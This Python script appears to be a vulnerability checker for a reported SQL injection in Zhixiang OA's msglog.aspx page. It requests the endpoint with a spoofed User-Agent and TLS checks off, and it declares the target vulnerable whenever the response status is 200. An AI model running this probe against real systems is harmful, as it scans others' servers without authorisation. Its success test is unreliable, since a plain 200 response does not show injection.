import sys
import requests
import urllib3
import time
from rich.console import Console


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(url):
    target_url = url + "/mainpage/msglog.aspx?user=1"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    console.print(now_time() + " [INFO]     正在致翔OA msglog.aspx SQL注入漏洞", style='bold blue')
    try:
        urllib3.disable_warnings()
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200:
            console.print(now_time() + " [SUCCESS]     存在致翔OA msglog.aspx SQL注入漏洞:{}".format(target_url), style='bold green')
        else:
            console.print(now_time() + " [WARNING]  不存在致翔OA msglog.aspx SQL注入漏洞", style='bold red')
    except Exception as e:
        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')


